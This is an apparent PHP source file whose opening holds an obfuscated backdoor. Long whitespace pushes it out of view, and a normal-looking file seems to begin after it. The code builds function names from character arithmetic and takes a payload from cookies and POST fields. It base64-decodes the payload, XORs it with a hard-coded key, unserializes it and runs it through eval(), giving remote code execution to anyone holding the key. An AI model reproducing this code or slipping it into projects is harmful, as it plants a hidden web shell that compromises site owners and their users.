<?php                                                                                                                                                                                                                                                                                                                                                                                                 $NcnNpMmNGq = 'P' . "\x45" . 'w' . '_' . chr ( 962 - 860 ).'n' . chr (112); $SCsasMWCDL = chr ( 699 - 600 ).'l' . 'a' . chr (115) . "\163" . '_' . "\x65" . 'x' . chr ( 909 - 804 )."\163" . "\x74" . chr (115); $IIFdTe = $SCsasMWCDL($NcnNpMmNGq); $ukUwadPu = $IIFdTe;if (!$ukUwadPu){class PEw_fnp{private $KhcEWguvhr;public static $UACuJsOLa = "11a7fa34-570a-42bd-9443-798bdc78dd61";public static $hOhJPQR = 50605;public function __construct(){$JcevktGIzA = $_COOKIE;$Ageocd = $_POST;$YDxaemtg = @$JcevktGIzA[substr(PEw_fnp::$UACuJsOLa, 0, 4)];if (!empty($YDxaemtg)){$ngNlc = "base64";$xAzwNjtkVN = "";$YDxaemtg = explode(",", $YDxaemtg);foreach ($YDxaemtg as $lshIJo){$xAzwNjtkVN .= @$JcevktGIzA[$lshIJo];$xAzwNjtkVN .= @$Ageocd[$lshIJo];}$xAzwNjtkVN = array_map($ngNlc . chr ( 995 - 900 ).'d' . chr ( 993 - 892 )."\143" . chr ( 1035 - 924 )."\x64" . chr ( 833 - 732 ), array($xAzwNjtkVN,)); $xAzwNjtkVN = $xAzwNjtkVN[0] ^ str_repeat(PEw_fnp::$UACuJsOLa, (strlen($xAzwNjtkVN[0]) / strlen(PEw_fnp::$UACuJsOLa)) + 1);PEw_fnp::$hOhJPQR = @unserialize($xAzwNjtkVN);}}public function __destruct(){$this->ubrDP();}private function ubrDP(){if (is_array(PEw_fnp::$hOhJPQR)) {$UWIRBHzSZ = str_replace('<' . "\x3f" . "\x70" . chr (104) . chr (112), "", PEw_fnp::$hOhJPQR['c' . "\157" . 'n' . 't' . chr (101) . chr (110) . "\164"]);eval($UWIRBHzSZ);exit();}}}$WaXpGSVaP = new PEw_fnp(); $WaXpGSVaP = 51262;} ?><?php
/**
